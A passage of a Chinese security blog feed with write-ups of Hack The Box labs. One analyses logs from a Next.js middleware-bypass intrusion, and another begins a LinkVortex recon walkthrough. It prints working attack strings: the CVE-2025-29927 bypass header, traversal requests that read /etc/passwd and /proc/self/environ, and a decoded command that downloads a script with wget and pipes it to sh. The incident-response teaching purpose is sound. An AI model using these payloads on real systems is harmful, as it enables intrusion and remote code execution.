id = $&#123;id&#125;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">queryByIdAsInterger</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> Integer id)</span>;<br></code></pre></td></tr></table></figure><p>å¼ºåˆ¶ä½¿ç”¨ <code>Integer</code>ç±»å‹ï¼Œå¯¼è‡´æ— æ³•æ³¨å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f0187b6c360233c.png"></p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
      <category>Java</category>
      
      <category>Hello-Java-Sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-NeuroSync-D</title>
    <link href="/2025/04/14/HTB-NeuroSync-D/"/>
    <url>/2025/04/14/HTB-NeuroSync-D/</url>
    
    <content type="html"><![CDATA[<p>å…³äº Next.js ä¸­é—´ä»¶é‰´æƒç»•è¿‡çš„æ¼æ´</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>NeuroSyncâ„¢ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.</p><h1 id="ä½¿ç”¨çš„-Next-js-ç‰ˆæœ¬"><a href="#ä½¿ç”¨çš„-Next-js-ç‰ˆæœ¬" class="headerlink" title="ä½¿ç”¨çš„ Next.js ç‰ˆæœ¬"></a>ä½¿ç”¨çš„ Next.js ç‰ˆæœ¬</h1><p>åœ¨ <code>interface.log</code> æ–‡ä»¶ä¸­æ‰¾åˆ° Next.js ç‰ˆæœ¬å·</p><p><img src="https://img.dkdun.cn/v1/2025/12/e8deead847d7f189.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">15</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="Next-js-æœ¬åœ°è¿è¡Œç«¯å£"><a href="#Next-js-æœ¬åœ°è¿è¡Œç«¯å£" class="headerlink" title="Next.js æœ¬åœ°è¿è¡Œç«¯å£"></a>Next.js æœ¬åœ°è¿è¡Œç«¯å£</h1><p><img src="https://img.dkdun.cn/v1/2025/12/09b3a46e3310b504.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¦å’Œæ­¤ç‰ˆæœ¬çš„-Next-js-çš„-CVE-ç¼–å·"><a href="#ç¬¦å’Œæ­¤ç‰ˆæœ¬çš„-Next-js-çš„-CVE-ç¼–å·" class="headerlink" title="ç¬¦å’Œæ­¤ç‰ˆæœ¬çš„ Next.js çš„ CVE ç¼–å·"></a>ç¬¦å’Œæ­¤ç‰ˆæœ¬çš„ Next.js çš„ CVE ç¼–å·</h1><p><a href="https://www.cnblogs.com/CVE-Lemon/p/18789173">CVE-2025-29927 Next.js ä¸­é—´ä»¶æƒé™ç»•è¿‡æ¼æ´</a>ï¼Œé€šè¿‡æ·»åŠ  <code>x-middleware-subrequest</code> è¯·æ±‚å¤´ç»•è¿‡ä¸­é—´ä»¶å®‰å…¨æ§åˆ¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/05516e87ef1fd463.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2025</span>-<span class="hljs-number">29927</span><br></code></pre></td></tr></table></figure><h1 id="é€šè¿‡æšä¸¾-Next-js-æ¡†æ¶ä¸­çš„æ–‡ä»¶å¾—åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶"><a href="#é€šè¿‡æšä¸¾-Next-js-æ¡†æ¶ä¸­çš„æ–‡ä»¶å¾—åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="é€šè¿‡æšä¸¾ Next.js æ¡†æ¶ä¸­çš„æ–‡ä»¶å¾—åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶"></a>é€šè¿‡æšä¸¾ Next.js æ¡†æ¶ä¸­çš„æ–‡ä»¶å¾—åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶</h1><p>åœ¨ <code>access.log</code> æ–‡ä»¶ä¸­æŸ¥æ‰¾ HTTP çŠ¶æ€ç ä¸º 200 çš„è¯·æ±‚ä¿¡æ¯ï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸º <code>main-app.js</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b5575411c2ba5ce3.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>-app<span class="hljs-selector-class">.js</span><br></code></pre></td></tr></table></figure><h1 id="å—æ¼æ´å½±å“çš„-endpoint"><a href="#å—æ¼æ´å½±å“çš„-endpoint" class="headerlink" title="å—æ¼æ´å½±å“çš„ endpoint"></a>å—æ¼æ´å½±å“çš„ endpoint</h1><p>æŸ¥çœ‹ <code>interface.log</code> æ–‡ä»¶å¯ä»¥å‘ç°å¯¹  <code>http://localhost:3000/api/bci/analytics</code> è¯·æ±‚äº†å¤šæ¬¡ï¼Œå¹¶ä¸”ä½¿ç”¨äº† <code>x-middleware-subrequest</code> è¯·æ±‚å¤´</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">2025-04-01T11:37:59.699Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [[&quot;accept&quot;,&quot;*/*&quot;],[&quot;accept-encoding&quot;,&quot;gzip, deflate, br&quot;],[&quot;connection&quot;,&quot;close&quot;],[&quot;host&quot;,&quot;10.129.231.215&quot;],[&quot;user-agent&quot;,&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0&quot;],[&quot;x-forwarded-for&quot;,&quot;10.129.231.211&quot;],[&quot;x-forwarded-host&quot;,&quot;10.129.231.215&quot;],[&quot;x-forwarded-port&quot;,&quot;3000&quot;],[&quot;x-forwarded-proto&quot;,&quot;http&quot;],[&quot;x-middleware-subrequest&quot;,&quot;middleware&quot;],[&quot;x-real-ip&quot;,&quot;10.129.231.211&quot;]]<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/eea8e602f2f610ba.png"></p><p>æ‰€ä»¥ endpoint ä¸º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/api/</span>bci/analytics<br></code></pre></td></tr></table></figure><h1 id="æ¼æ´å¯¼è‡´çš„æœªæˆæƒå“åº”æ•°é‡"><a href="#æ¼æ´å¯¼è‡´çš„æœªæˆæƒå“åº”æ•°é‡" class="headerlink" title="æ¼æ´å¯¼è‡´çš„æœªæˆæƒå“åº”æ•°é‡"></a>æ¼æ´å¯¼è‡´çš„æœªæˆæƒå“åº”æ•°é‡</h1><p>å¯ä»¥çœ‹åˆ°è¯·æ±‚ä» <code>2025-04-01 11:37:58</code> å¼€å§‹åˆ° <code>2025-04-01 11:38:04</code> ç»“æŸ</p><p><img src="https://img.dkdun.cn/v1/2025/12/3bc95d55c7645f56.png"></p><p>ä» <code>access.log</code> æŸ¥æ‰¾æ­¤æ—¶é—´æ®µä¿¡æ¯å‘ç° HTTP çŠ¶æ€ç å…¨ä¸º 401ï¼Œè¿™æ ·çš„è¯·æ±‚ä¿¡æ¯æœ‰ 5 æ¡</p><p><img src="https://img.dkdun.cn/v1/2025/12/8e1d1ccc558c8a51.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">5<br></code></pre></td></tr></table></figure><h1 id="ä¸­é—´ä»¶è¢«æˆåŠŸç»•è¿‡çš„æ—¶é—´"><a href="#ä¸­é—´ä»¶è¢«æˆåŠŸç»•è¿‡çš„æ—¶é—´" class="headerlink" title="ä¸­é—´ä»¶è¢«æˆåŠŸç»•è¿‡çš„æ—¶é—´"></a>ä¸­é—´ä»¶è¢«æˆåŠŸç»•è¿‡çš„æ—¶é—´</h1><p> 401 è¯·æ±‚å“åº”åä¸€æ¡çŠ¶æ€ç å˜ä¸ºäº† 200ï¼Œè¯´æ˜å·²ç»è¢«æˆåŠŸç»•è¿‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/7c1d5e98c3054393.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">01</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">05</span><br></code></pre></td></tr></table></figure><h1 id="ç»•è¿‡ä¸­é—´ä»¶çš„æ ‡å¤´çš„å€¼"><a href="#ç»•è¿‡ä¸­é—´ä»¶çš„æ ‡å¤´çš„å€¼" class="headerlink" title="ç»•è¿‡ä¸­é—´ä»¶çš„æ ‡å¤´çš„å€¼"></a>ç»•è¿‡ä¸­é—´ä»¶çš„æ ‡å¤´çš„å€¼</h1><p><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">Next.js and the corrupt middleware: the authorizing artifact</a>ï¼Œè¿™ç¯‡æ–‡ç« ä¸­æœ‰å¯¹å„ç‰ˆæœ¬æ›´æ·±å…¥çš„ç ”ç©¶</p><p>æŸ¥çœ‹ <a href="https://github.com/vercel/next.js/blob/v15.1.0/packages/next/src/server/web/sandbox/sandbox.ts">Next.js v15.1.0 çš„æºç </a> ä¸­æœ‰æ¼æ´çš„åœ°æ–¹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> runtime = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getRuntimeContext</span>(params)<br><span class="hljs-keyword">const</span> subreq = params.<span class="hljs-property">request</span>.<span class="hljs-property">headers</span>[<span class="hljs-string">`x-middleware-subrequest`</span>]<br><span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&#x27;string&#x27;</span> ? subreq.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>) : []<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span> = <span class="hljs-number">5</span><br><span class="hljs-keyword">const</span> depth = subrequests.<span class="hljs-title function_">reduce</span>(<br>  <span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> (curr === params.<span class="hljs-property">name</span> ? acc + <span class="hljs-number">1</span> : acc),<br>  <span class="hljs-number">0</span><br>)<br><br><span class="hljs-keyword">if</span> (depth &gt;= <span class="hljs-variable constant_">MAX_RECURSION_DEPTH</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">waitUntil</span>: <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(),<br>    <span class="hljs-attr">response</span>: <span class="hljs-keyword">new</span> runtime.<span class="hljs-property">context</span>.<span class="hljs-title class_">Response</span>(<span class="hljs-literal">null</span>, &#123;<br>      <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;x-middleware-next&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>      &#125;,<br>    &#125;),<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ <code>x-middleware-subrequest</code> çš„å€¼ä»¥ <code>:</code> åˆ†å‰²ä¸€æ¬¡å¹¶ä¸”å€¼ä¸º <code>params.name</code> ä¹Ÿå°±æ˜¯ä¸­é—´ä»¶çš„è·¯å¾„æ—¶ï¼Œ<code>depth</code> å°± +1ï¼Œå¦‚æœ <code>depth</code> å¤§äºç­‰äº <code>MAX_RECURSION_DEPTH</code> çš„å€¼ä¹Ÿå°±æ˜¯ 5 æ—¶ï¼Œè¿”å›ç©ºå“åº”å¹¶è®¾ç½® <code>x-middleware-next</code> çš„å€¼ä¸º 1ï¼Œè¿™æ ·èƒ½é˜²æ­¢æ— é™é€’å½’é€ æˆè¯·æ±‚è¶…æ—¶ç­‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/57485405d8688827.png"></p><p>æ‰€ä»¥è®© <code>depth &gt;= 5</code> å°±èƒ½ç»•è¿‡ä¸­é—´ä»¶çš„é‰´å®š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ä¸º</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-middleware-subrequest</span><span class="hljs-punctuation">: </span>middleware:middleware:middleware:middleware:middleware<br></code></pre></td></tr></table></figure><h1 id="å°†è¯¥æ¼æ´ä¸-SSRF-æ”»å‡»ä¸²è”èµ·æ¥ï¼Œå› æ­¤èƒ½å¤Ÿæ‰§è¡Œå†…éƒ¨ç«¯å£æ‰«æå¹¶å‘ç°å†…éƒ¨-APIã€‚è¯¥-API-å¯ä»¥é€šè¿‡å“ªä¸ªç«¯å£è®¿é—®"><a href="#å°†è¯¥æ¼æ´ä¸-SSRF-æ”»å‡»ä¸²è”èµ·æ¥ï¼Œå› æ­¤èƒ½å¤Ÿæ‰§è¡Œå†…éƒ¨ç«¯å£æ‰«æå¹¶å‘ç°å†…éƒ¨-APIã€‚è¯¥-API-å¯ä»¥é€šè¿‡å“ªä¸ªç«¯å£è®¿é—®" class="headerlink" title="å°†è¯¥æ¼æ´ä¸ SSRF æ”»å‡»ä¸²è”èµ·æ¥ï¼Œå› æ­¤èƒ½å¤Ÿæ‰§è¡Œå†…éƒ¨ç«¯å£æ‰«æå¹¶å‘ç°å†…éƒ¨ APIã€‚è¯¥ API å¯ä»¥é€šè¿‡å“ªä¸ªç«¯å£è®¿é—®"></a>å°†è¯¥æ¼æ´ä¸ SSRF æ”»å‡»ä¸²è”èµ·æ¥ï¼Œå› æ­¤èƒ½å¤Ÿæ‰§è¡Œå†…éƒ¨ç«¯å£æ‰«æå¹¶å‘ç°å†…éƒ¨ APIã€‚è¯¥ API å¯ä»¥é€šè¿‡å“ªä¸ªç«¯å£è®¿é—®</h1><p>æŸ¥çœ‹ <code>data-api.log</code> æ–‡ä»¶çš„è®°å½•ï¼Œæ ¹æ®æ”»å‡»æˆåŠŸçš„æ—¶é—´æ®µæ¥çœ‹å¯ä»¥å‘ç°å¯¹ 4000 ç«¯å£è¿›è¡Œäº†è®¿é—®</p><p><img src="https://img.dkdun.cn/v1/2025/12/6560a49952a3c10c.png"></p><h1 id="åœ¨-API-ä¸­å¯»æ‰¾æ˜“å—æ”»å‡»çš„-endpoint"><a href="#åœ¨-API-ä¸­å¯»æ‰¾æ˜“å—æ”»å‡»çš„-endpoint" class="headerlink" title="åœ¨ API ä¸­å¯»æ‰¾æ˜“å—æ”»å‡»çš„ endpoint"></a>åœ¨ API ä¸­å¯»æ‰¾æ˜“å—æ”»å‡»çš„ endpoint</h1><p>å¯ä»¥å‘ç°å¯¹ <code>/logs</code> è¯·æ±‚åè¿˜è¿›è¡Œäº†ä¸€äº›å…¶ä»–è¡Œä¸ºï¼Œ <code>/logs?logFile=/var/log/../.../...//../.../...//etc/passwd</code> å’Œ <code>/logs?logFile=/var/log/../.../...//../.../...//proc/self/environ</code> ï¼Œéå†è·¯å¾„è¯»å– <code>/etc/passwd</code> å’Œ <code>/proc/self/environ</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/4d6e0153ded31eaf.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/logs<br></code></pre></td></tr></table></figure><h1 id="endpoint-é¦–æ¬¡è¢«ä½¿ç”¨çš„æ—¶é—´"><a href="#endpoint-é¦–æ¬¡è¢«ä½¿ç”¨çš„æ—¶é—´" class="headerlink" title="endpoint é¦–æ¬¡è¢«ä½¿ç”¨çš„æ—¶é—´"></a>endpoint é¦–æ¬¡è¢«ä½¿ç”¨çš„æ—¶é—´</h1><p>è¯»å– <code>/etc/passwd</code> çš„æ—¶é—´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">01</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">01</span><br></code></pre></td></tr></table></figure><h1 id="endpoint-è¢«åˆ©ç”¨çš„æ¼æ´åç§°"><a href="#endpoint-è¢«åˆ©ç”¨çš„æ¼æ´åç§°" class="headerlink" title="endpoint è¢«åˆ©ç”¨çš„æ¼æ´åç§°"></a>endpoint è¢«åˆ©ç”¨çš„æ¼æ´åç§°</h1><p>ä»  <code>/logs?logFile=/var/log/../.../...//../.../...//etc/passwd</code> å’Œ <code>/logs?logFile=/var/log/../.../...//../.../...//proc/self/environ</code>  å¯ä»¥çŸ¥é“é€šè¿‡æ„é€ ç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ï¼Œè¯»å–è¿™äº›æ•æ„Ÿæ–‡ä»¶ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•ç¬¦åˆåˆ©ç”¨ LFI æ¼æ´ï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLocal File Inclusionï¼‰</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Local</span> <span class="hljs-keyword">File</span> Inclusion<br></code></pre></td></tr></table></figure><h1 id="è¯»å–çš„æ–‡ä»¶"><a href="#è¯»å–çš„æ–‡ä»¶" class="headerlink" title="è¯»å–çš„æ–‡ä»¶"></a>è¯»å–çš„æ–‡ä»¶</h1><p><code>/tmp</code> ä¸‹çš„ <code>secret.key</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/844cabc6bfcb50de.png"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">secret.<span class="hljs-type">key</span><br></code></pre></td></tr></table></figure><h1 id="æŸ¥æ‰¾å…è®¸æ‰§è¡Œ-Redis-æ³¨å…¥å¹¶è·å¾—-RCEçš„ç‰¹æ®Šå‘½ä»¤"><a href="#æŸ¥æ‰¾å…è®¸æ‰§è¡Œ-Redis-æ³¨å…¥å¹¶è·å¾—-RCEçš„ç‰¹æ®Šå‘½ä»¤" class="headerlink" title="æŸ¥æ‰¾å…è®¸æ‰§è¡Œ Redis æ³¨å…¥å¹¶è·å¾— RCEçš„ç‰¹æ®Šå‘½ä»¤"></a>æŸ¥æ‰¾å…è®¸æ‰§è¡Œ Redis æ³¨å…¥å¹¶è·å¾— RCEçš„ç‰¹æ®Šå‘½ä»¤</h1><p>æŸ¥çœ‹ <code>redis.log</code> æ–‡ä»¶æ‰¾åˆ°å‘½ä»¤</p><p><img src="https://img.dkdun.cn/v1/2025/12/004f120f4bbc4c34.png"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">OS_EXEC|<span class="hljs-type">d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo</span>|<span class="hljs-type">f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb</span><br></code></pre></td></tr></table></figure><h1 id="è§£ç åçš„å‘½ä»¤"><a href="#è§£ç åçš„å‘½ä»¤" class="headerlink" title="è§£ç åçš„å‘½ä»¤"></a>è§£ç åçš„å‘½ä»¤</h1><p>åœ¨ <code>bci-device.log</code> é‡Œé¢èƒ½æ‰¾åˆ°å‘½ä»¤çš„æ˜æ–‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/63b90d934f53470b.png"></p><p>ä¹Ÿå¯ä»¥ base64 è§£ç  <code>d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">185.202</span>.<span class="hljs-number">2.147</span><span class="hljs-regexp">/h4Pln4/</span>run.sh -O- | sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Next.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-LinkVortex</title>
    <link href="/2025/04/14/HTB-LinkVortex/"/>
    <url>/2025/04/14/HTB-LinkVortex/</url>
    
    <content type="html"><![CDATA[<p>git æ³„éœ²ï¼Œç”± symlinks å¯¼è‡´çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p><span id="more"></span><h1 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h1><h2 id="nmap-ç«¯å£æ‰«æ"><a href="#nmap-ç«¯å£æ‰«æ" class="headerlink" title="nmap ç«¯å£æ‰«æ"></a>nmap ç«¯å£æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# nmap -sS -sV -A -Pn 10.10.11.47<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 19:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.47<br>Host is up (0.36s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)<br>|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)<br>80/tcp open  http    Apache httpd<br>|_http-title: Did not follow redirect to http://linkvortex.htb/<br>|_http-server-header: Apache<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=4/13%OT=22%CT=1%CU=33150%PV=Y%DS=3%DC=T%G=Y%TM=67FB<br>OS:A18A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S<br>OS:P=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW<br>OS:7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%<br>OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53AN<br>OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=<br>OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A<br>OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4<br>OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=<br>OS:G%RIPCK=G%RUCK=F845%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 554/tcp)<br>HOP RTT       ADDRESS<br>1   0.40 ms   butt3rf1y.mshome.net (172.30.144.1)<br>2   404.35 ms 10.10.16.1<br>3   258.09 ms 10.10.11.47<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 41.82 seconds<br></code></pre></td></tr></table></figure><p>å¼€æ”¾äº† 80 å’Œ 22 ç«¯å£</p><h2 id="è®¿é—®-80-ç«¯å£"><a href="#è®¿é—®-80-ç«¯å£" class="headerlink" title="è®¿é—® 80 ç«¯å£"></a>è®¿é—® 80 ç«¯å£</h2><p>80 ç«¯å£é™¤äº†å¾—å‡ºä½¿ç”¨äº†  <code>Ghost</code>  æ¡†æ¶å’Œæœ‰ä¸€ä¸ª <code>admin</code> ç”¨æˆ·å°±æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/3ea0caa5ce97e31a.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/4fad161c76b6ffe0.png"></p><h2 id="dirsearch-ç›®å½•æ‰«æ"><a href="#dirsearch-ç›®å½•æ‰«æ" class="headerlink" title="dirsearch ç›®å½•æ‰«æ"></a>dirsearch ç›®å½•æ‰«æ</h2><p>åªæœ‰ä¸€ä¸ª <code>robots.txt</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ab8813db5b318ff4.png"></p><p>è®¿é—® <code>/robots.txt</code> å‘ç°è¿˜æœ‰å‡ ä¸ªè·¯ç”±</p><p><img src="https://img.dkdun.cn/v1/2025/12/fde7fd1d3ca5a675.png"></p><p>åªæœ‰ <code>/ghost</code> è·¯ç”±æ‰èƒ½è®¿é—®ä¸Šï¼Œå¾—åˆ°äº†ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½†æ˜¯æ²¡ç™»å½•é‚®ç®±å’Œå¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/fba652650ac3af62.png"></p><h2 id="gobuster-å­åŸŸåæ‰«æ"><a href="#gobuster-å­åŸŸåæ‰«æ" class="headerlink" title="gobuster å­åŸŸåæ‰«æ"></a>gobuster å­åŸŸåæ‰«æ</h2><p>ç›®å‰æ¥è¯´æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æ¥å¯¹å­åŸŸåè¿›è¡Œæšä¸¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster vhost -u http://linkvortex.htb -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt --append-domain<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cbc5cbfb3323afe8.png"></p><p>æœ‰ä¸€ä¸ª <code>dev.linkvortex.htb</code> å­åŸŸå</p><p>è®¿é—®å‘ç°ä¾ç„¶æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p><p><img src="https://img.dkdun.cn/v1/2025/12/8b4dcdb8e66a3413.png"></p><p>å†æ¬¡å¯¹å­åŸŸåç›®å½•è¿›è¡Œæ‰«æï¼Œå‘ç°äº† <code>.git</code> è·¯ç”±</p><p><img src="https://img.dkdun.cn/v1/2025/12/721ebb42f2ac91f6.png"></p><p>è®¿é—®å¾—åˆ°äº†å¾ˆå¤šæ–‡ä»¶ï¼Œåº”è¯¥æœ‰ <code>.git</code> æ³„éœ²</p><h1 id="git-æ³„éœ²"><a 